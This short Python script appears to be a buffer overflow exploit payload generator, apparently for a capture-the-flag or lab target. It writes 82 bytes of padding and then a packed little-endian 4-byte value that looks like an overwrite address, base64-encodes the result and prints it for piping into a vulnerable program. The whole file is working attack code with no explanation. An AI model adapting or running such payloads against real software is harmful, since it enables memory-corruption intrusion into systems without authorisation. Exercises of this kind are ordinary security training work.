
import sys
import struct
import base64

buf = b'RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR'
buf += struct.pack('<I', 3338363024)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
